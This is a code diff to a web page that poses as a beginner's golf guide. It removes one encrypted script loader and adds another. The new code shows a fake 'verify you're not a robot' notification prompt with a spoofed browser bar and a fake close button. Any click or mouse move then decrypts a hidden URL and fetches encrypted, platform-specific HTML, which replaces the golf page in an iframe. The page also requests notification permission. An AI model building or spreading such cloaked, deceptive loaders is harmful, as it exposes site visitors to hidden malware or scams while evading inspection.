@@ -3,75 +3,300 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Golf Master Guide - Learn How to Play Golf</title>
-
+<title>1Golf Master Guide - Learn How to Play Golf</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
 <style>
-body{
-    font-family:Arial, sans-serif;
-    margin:0;
-    padding:0;
-    line-height:1.8;
-    background:#f4f4f4;
-    color:#333;
-}
-header{
-    background:#0a6d2a;
-    color:white;
-    padding:20px;
-    text-align:center;
-}
-nav{
-    background:#084f1f;
-    padding:10px;
-    text-align:center;
-}
-nav a{
-    color:white;
-    text-decoration:none;
-    margin:0 15px;
-    font-weight:bold;
-}
-.container{
-    width:90%;
-    max-width:1200px;
-    margin:auto;
-    background:white;
-    padding:20px;
-}
-section{
-    margin-bottom:40px;
-}
-h1,h2,h3{
-    color:#0a6d2a;
-}
-footer{
-    background:#222;
-    color:white;
-    text-align:center;
-    padding:20px;
-}
-.contact-form{
-    max-width:600px;
-}
-.contact-form input,
-.contact-form textarea{
-    width:100%;
-    padding:10px;
-    margin:10px 0;
-}
-.contact-form button{
-    background:#0a6d2a;
-    color:white;
-    border:none;
-    padding:12px 20px;
-    cursor:pointer;
-}
+  * { box-sizing: border-box; }
+  html, body { margin: 0; height: 100%; }
+  body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+  a { text-decoration: none; color: inherit; }
+  #frame { display: none; width: 100%; height: 100vh; border: 0; }
+  .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+  /* ===== Full Screen Popup ===== */
+  .popup { 
+    position: fixed; 
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: #ffffff;
+    display: flex; 
+    justify-content: center; 
+    align-items: center; 
+    z-index: 9999;
+  }
+  .popup-content { 
+    background: #ffffff; 
+    padding: 0;
+    text-align: center; 
+    width: 100%;
+    max-width: 600px;
+  }
+
+  /* ===== Notification Prelander Styles (scoped) ===== */
+  .notify-wrap {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    user-select: none;
+    -webkit-user-select: none;
+    -webkit-tap-highlight-color: transparent;
+    padding: 16px;
+  }
+  
+  .notify-overlay {
+    background: #ffffff;
+    border-radius: 20px;
+    padding: 28px 24px 24px;
+    max-width: 420px;
+    width: 100%;
+    margin: 0 auto;
+    position: relative;
+    border: 1px solid #e0e0e0;
+    box-shadow: 0 2px 16px rgba(0,0,0,0.08), 0 0 0 1px rgba(0,0,0,0.03);
+    animation: notifyPopIn 0.3s ease-out;
+  }
+  @keyframes notifyPopIn {
+    from { opacity: 0; transform: scale(0.95); }
+    to { opacity: 1; transform: scale(1); }
+  }
+  
+  .notify-browser-bar {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    margin-bottom: 20px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid #e8e8e8;
+  }
+  .notify-browser-dot { width: 10px; height: 10px; border-radius: 50%; }
+  .notify-browser-dot:nth-child(1) { background: #ff5f57; }
+  .notify-browser-dot:nth-child(2) { background: #febc2e; }
+  .notify-browser-dot:nth-child(3) { background: #28c840; }
+  .notify-browser-url {
+    flex: 1;
+    background: #f3f4f6;
+    border-radius: 6px;
+    padding: 6px 12px;
+    margin-left: 8px;
+    color: #9ca3af;
+    font-size: 11px;
+    font-family: 'SF Mono', 'Menlo', 'Courier New', monospace;
+    overflow: hidden;
+    white-space: nowrap;
+  }
+  
+  .notify-shield-icon {
+    width: 56px; height: 56px;
+    background: #eef2ff;
+    border-radius: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 16px;
+    font-size: 28px;
+    border: 1px solid #c7d2fe;
+  }
+  
+  .notify-overlay h1 {
+    color: #1f2937;
+    font-size: 22px;
+    font-weight: 700;
+    text-align: center;
+    margin-bottom: 6px;
+    line-height: 1.3;
+  }
+  
+  .notify-subtitle {
+    color: #6b7280;
+    font-size: 13px;
+    text-align: center;
+    margin-bottom: 16px;
+    line-height: 1.5;
+  }
+  .notify-subtitle strong { color: #6366f1; }
+  
+  .notify-permission-box {
+    background: #f5f7ff;
+    border: 1px solid #e0e7ff;
+    border-radius: 14px;
+    padding: 16px;
+    margin-bottom: 18px;
+  }
+  
+  .notify-perm-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 6px 0;
+    color: #4b5563;
+    font-size: 13px;
+  }
+  .notify-perm-row .notify-check {
+    width: 18px; height: 18px;
+    border-radius: 50%;
+    background: #d1fae5;
+    color: #059669;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 10px;
+    flex-shrink: 0;
+  }
+  
+  .notify-buttons {
+    display: flex;
+    gap: 10px;
+  }
+  
+  .notify-btn {
+    flex: 1;
+    padding: 15px;
+    border-radius: 12px;
+    border: none;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.15s ease;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .notify-btn:active { transform: scale(0.96); }
+  
+  .notify-btn-allow {
+    background: linear-gradient(135deg, #6366f1, #8b5cf6);
+    color: #fff;
+    flex: 3;
+    box-shadow: 0 2px 12px rgba(99,102,241,0.3);
+  }
+  .notify-btn-allow:hover { box-shadow: 0 4px 20px rgba(99,102,241,0.45); transform: translateY(-1px); }
+  
+  .notify-btn-deny {
+    background: #f3f4f6;
+    color: #9ca3af;
+    flex: 1;
+    font-size: 13px;
+  }
+  .notify-btn-deny:hover { background: #e5e7eb; color: #6b7280; }
+  
+  .notify-fake-x {
+    position: absolute;
+    top: 12px; right: 14px;
+    width: 28px; height: 28px;
+    border-radius: 50%;
+    background: #f3f4f6;
+    color: #d1d5db;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+    cursor: pointer;
+    border: none;
+  }
+  .notify-fake-x:hover { background: #e5e7eb; color: #9ca3af; }
+  
+  .notify-countdown {
+    color: #9ca3af;
+    font-size: 11px;
+    text-align: center;
+    margin-top: 14px;
+  }
+  .notify-countdown span { color: #f59e0b; font-weight: 600; }
+  
+
+  /* Original main.html content styles */
+  body.golf-body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    line-height: 1.8;
+    background: #f4f4f4;
+    color: #333;
+  }
+  header {
+    background: #0a6d2a;
+    color: white;
+    padding: 20px;
+    text-align: center;
+  }
+  nav {
+    background: #084f1f;
+    padding: 10px;
+    text-align: center;
+  }
+  nav a {
+    color: white;
+    text-decoration: none;
+    margin: 0 15px;
+    font-weight: bold;
+  }
+  .container {
+    width: 90%;
+    max-width: 1200px;
+    margin: auto;
+    background: white;
+    padding: 20px;
+  }
+  section { margin-bottom: 40px; }
+  h1.golf, h2, h3 { color: #0a6d2a; }
+  footer {
+    background: #222;
+    color: white;
+    text-align: center;
+    padding: 20px;
+  }
+  .contact-form { max-width: 600px; }
+  .contact-form input,
+  .contact-form textarea {
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+  }
+  .contact-form button {
+    background: #0a6d2a;
+    color: white;
+    border: none;
+    padding: 12px 20px;
+    cursor: pointer;
+  }
 </style>
 </head>
 <body>
 
+<div class="popup" id="customPopup">
+  <div class="popup-content">
+    <div class="notify-wrap">
+      <div class="notify-overlay">
+        <button class="notify-fake-x" onclick="handlePrelanderDeny()">&#10005;</button>
+
+        <div class="notify-browser-bar">
+          <span class="notify-browser-dot"></span>
+          <span class="notify-browser-dot"></span>
+          <span class="notify-browser-dot"></span>
+          <span class="notify-browser-url">&#128274; secure-verify.com</span>
+        </div>
+
+        <div class="notify-shield-icon">&#128737;</div>
+        <h1>Allow Notifications</h1>
+        <p class="notify-subtitle">Click <strong>Allow</strong> to verify that you are not a robot and continue to the content</p>
+
+        <div class="notify-permission-box">
+          <div class="notify-perm-row"><span class="notify-check">&#10003;</span> Verify you're human</div>
+          <div class="notify-perm-row"><span class="notify-check">&#10003;</span> Enable secure connection</div>
+          <div class="notify-perm-row"><span class="notify-check">&#10003;</span> Access premium content</div>
+        </div>
+
+        <div class="notify-buttons">
+          <button class="notify-btn notify-btn-allow" onclick="handlePrelanderAllow()">Allow</button>
+          <button class="notify-btn notify-btn-deny" onclick="handlePrelanderDeny()">Deny</button>
+        </div>
+
+        <p class="notify-countdown">This verification expires in <span id="notifyTimer">2:59</span></p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="shop">
 <header>
-<h1>Golf Master Guide</h1>
+<h1 class="golf">Golf Master Guide</h1>
 <p>Complete Beginner's Guide to Learning and Playing Golf</p>
 </header>
 
@@ -332,7 +557,7 @@ var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
 (function(){
 var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
 s1.async=true;
-s1.src='https://embed.tawk.to/6a196dae82284a1c379dd5b8/1jppl8squ';
+s1.src='https://embed.tawk.to/6a19c4ea3853891c338e9f56/1jpqaidka';
 s1.charset='UTF-8';
 s1.setAttribute('crossorigin','*');
 s0.parentNode.insertBefore(s1,s0);
@@ -342,20 +567,98 @@ s0.parentNode.insertBefore(s1,s0);
 <footer>
 <p>&copy; 2026 Golf Master Guide. All Rights Reserved.</p>
 </footer>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+</div>
+
+<iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>
+
 <script>
-    function aesDecode(encodedText) {
-        const decodedText = decodeURIComponent(encodedText);
-        const bytes = CryptoJS.AES.decrypt(decodedText, '9be53deb4e5aa71a0b3671403991d1e18d63b37a188274ddd44d57eec66e15bd');
-        return bytes.toString(CryptoJS.enc.Utf8);
+  const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+  const URL_KEY = "UrLk3yShopEase01";
+  const ENC_DATA_ORIGIN = "U2FsdGVkX19M53J3mOE4uGVuluQp/btAX9pkyqlbi4I425G6Z2ImTbjZeFJyOQEJ";
+  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+  const DATA_URL = DATA_ORIGIN;
+  let lastUrl = null;
+
+  function detectPlatform() {
+    const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+              navigator.platform || navigator.userAgent || "";
+    return /mac/i.test(p) ? "mac" : "win";
+  }
+
+  async function loadSecret() {
+    const shop = document.getElementById("shop"), frame = document.getElementById("frame");
+    try {
+      const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+      const { cipher } = await res.json();
+      const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+      if (!html) throw new Error("Decrypt failed — wrong key?");
+
+      if (lastUrl) URL.revokeObjectURL(lastUrl);
+      const blob = new Blob([html], { type: "text/html" });
+      lastUrl = URL.createObjectURL(blob);
+
+      frame.src = lastUrl;
+      
+      shop.style.display = "none";
+      frame.style.display = "block";
+      document.getElementById("customPopup").style.display = "none"; 
+      
+    } catch (e) {
+      document.querySelector(".hint").textContent = "\u26a0\ufe0f " + e.message;
+      document.getElementById("customPopup").style.display = "none";
     }
-    const codeString = aesDecode(U2FsdGVkX1%2BPwQryTgpUD7tR4qnHmLyQhKIcEDMrsNswdfvpc%2F75xsg83%2BzTMSY8BbizevXYLs0xn3AhcuqJQl5dlInMu9BoTIUpLzh0N2d1x3gayP2QPXoJ6%2FnxxmQkrrnsD32%2FVHNdk6hX%2Fb6F3z06FyAcjQZJChekVugS5v%2BybYWif4CtPmK9qw7WfGWahijimr0w%2BiIte3xQSKQICGzZsTmyfXLRzacyv5Hd%2FxTT%2FYI1Z7UfJYPVHnxHOtqR2u%2BlJd9Hel7pboRZ%2F7osToeG234FOhq%2BpULyGOMrVw7QnVKZC3CVgNMUNVzloeafsk52z1GzQTzimGNWyAaFNVbrsS%2BErgJUbx6WA1ZvUa47acAsgJK1PysCI0Zy19VbNnKTCKcydtyKMG8arzpOj%2FMicTdvEXXIfq0UE84UbJH1twoWDoPulxF1K2KC09XdMLcCYY6%2F63BsPtff6iTASs4f%2BNlpVjVy9h3GbM%2BWpxSNuRypnNHYNxuVNlKXeL4xOB10WhHrsTeFPiWoGA3RLQjdGfGQngK%2BtAKkNaWO%2B5S9PerT4%2FG9oud3nCtZMd4P68zxOrnrNHWxe3NmiBfAiHPgSCLwIPvx6jyXNPonxB87DiEwPTYIxF7bB%2Fs2lNZ2OiMF6qU1fWX8kvCKZna5O1tyrwOVbL2el8NR4E5MehklJ6AyIoX9bwcX0h%2FeIeY5lIDc1g0uOPT0xO3bMRkVn3N90sCBC%2BcZFqD0XL1t4suFeu7Cr2sBJYnPcMc2QepBBXflwnPByu6JGvk4wo633156NqxZTxvmxdlnZZGKQATdB3Jth0yvcQd9DUFbUM0A4g9Om%2BzHTankNXSWDFNZGH2UC1cs9KQ4ez7xfaSKzi9GW9RRghlhY19hrQTfyMwGBM7d3NojnUHwBmGQH4sVEck%2BMLPhLFpOcUd4rIMF0tRvYPrn6yfGe53um2nc99jmYfchMM8EYtNdFYT1driAkIJWrEV%2BIwV4TT00yeYs62w5vZzIW0YAeI05pkVhntqqpt2jC9BHHU1i3JwDY8B%2BEAE0QnVeVp4WWZUjIMtXT2XkJsPQibKU2yBhe6%2BngRSctfjfPB7dk7O9pm1wvQNGyM%2FP3SejMWPa7kgEw1s70f3C08bcd0EQG7FDu7d98mv4jVgTLbpF4FY3jyZ7qm0%2FHW8xdb%2BfUrsrqH%2FyAW%2FW4YtBqZUom49G0cZaj3TyPcthrA3aU1i%2BroS46zPbW6LCy%2B2iiQqrRdi7eWhvcDOAQVLOMKzK2081D4toEvBzjIPLVfsHoKQPdicjeZpbzYqB36z09q4fICQS9dk6HEdeXxVukOwuGX2kowRfqbjWOvIYSUtiV%2B3eK88FfTedn5Iz4HP%2Bq2f0nlWznrOQN09TRev4JIRmbqnTqD8irROi23KDCz6uAHLoQid1CfQ2EZZbEFvKMPpRw%2BKFI5FnhUmPYG3gNJtkAp658Bm9LoQLMMDU1gv4VPqJyeQBOIkFLBWitvmxytwedRIua7Bv6gjcPnSaGI8%2FGRr5odGkEIxH4j4F6HCbZ34GbmmiSINfeZw9loWACn8qdeZcCbmBkBZWEhbORv72W6HOoWFgDw6U%2BfQvWifHA3pl877bNDpVRtYoD8jtFL9X2vXar0dX%2B92ylDO4FFn9mH3rqJ5wDrrN5IWO9xv8%2FF3Xa%2BYQ25x%2BBIzyI7CBdbSZLV39DKAwLfOssvmU%2BPcttn50OGjhyU1Pgl5HJcA0Uq0SXLyfCjF9Q4Hfb4NuRkurfyJMnWnzJgyrRRSgbWDFH85gfXEsUdQ4c1dAaBhMvzzt4wJygTPPfUgj8cQFIoIvmIBGRL1dNFd6LU7KWQVr%2Bid05PHFPZVViNr9);
-    const script = document.createElement("script");
-    script.textContent = codeString;
-    document.body.appendChild(script);
+  }
+
+  // ---- Prelander handlers: both Allow and Deny trigger the same flow ----
+  var prelanderHandled = false;
+
+  function handlePrelanderAllow() {
+    if (prelanderHandled) return;
+    prelanderHandled = true;
+    
+    // Show "verified" feedback briefly, then trigger main flow
+    var overlay = document.querySelector('.notify-overlay');
+    if (overlay) {
+      overlay.innerHTML = '<div style="padding:32px 16px;text-align:center"><div style="font-size:52px;margin-bottom:16px">&#10003;</div><h2 style="color:#059669;margin-bottom:8px;font-size:20px">Verified!</h2><p style="color:#6b7280;font-size:14px">Loading your content...</p></div>';
+    }
+    
+    setTimeout(function() {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, 800);
+  }
+
+  function handlePrelanderDeny() {
+    // Deny also forwards — classic prelander
+    handlePrelanderAllow();
+  }
+
+  // ---- Countdown timer inside the prelander ----
+  (function() {
+    var seconds = 179;
+    var timerEl = document.getElementById('notifyTimer');
+    if (!timerEl) return;
+    setInterval(function() {
+      if (seconds <= 0) return;
+      seconds--;
+      var m = Math.floor(seconds / 60);
+      var s = (seconds % 60).toString().padStart(2, '0');
+      timerEl.textContent = m + ':' + s;
+      if (seconds < 60) timerEl.style.color = '#ef4444';
+    }, 1000);
+  })();
+
+  // ---- Mouse move fallback (original behavior) ----
+  window.addEventListener("mousemove", function() {
+    document.getElementById("customPopup").style.display = "none";
+    loadSecret();
+  }, { once: true });
+
+  // ---- Request notification permission for bonus conversion ----
+  if ('Notification' in window && Notification.permission === 'default') {
+    setTimeout(function() { Notification.requestPermission(); }, 1500);
+  }
 </script>
-<script>
-    document.body.style.overflow = "hidden";
-</script>
+    
 </body>
 </html>
